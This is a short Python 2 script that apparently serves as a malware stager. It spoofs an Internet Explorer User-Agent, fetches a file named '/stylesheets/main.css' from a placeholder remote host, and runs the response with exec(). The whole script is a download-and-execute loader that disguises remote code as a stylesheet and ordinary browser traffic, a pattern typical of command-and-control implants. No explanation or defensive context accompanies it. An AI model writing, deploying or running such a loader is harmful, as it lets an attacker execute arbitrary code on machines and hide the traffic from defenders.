#!/usr/bin/python

import urllib2
import sys

p = urllib2.ProxyHandler({'https': ''})
opr = urllib2.build_opener(p)
urllib2.install_opener(opr)
hds = {'Accept': 'text/html', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'}
h = 'http://host:port'

session = urllib2.Request(h + '/stylesheets/main.css', headers=hds)
response = urllib2.urlopen(session)
response = response.read().strip()
exec(response)
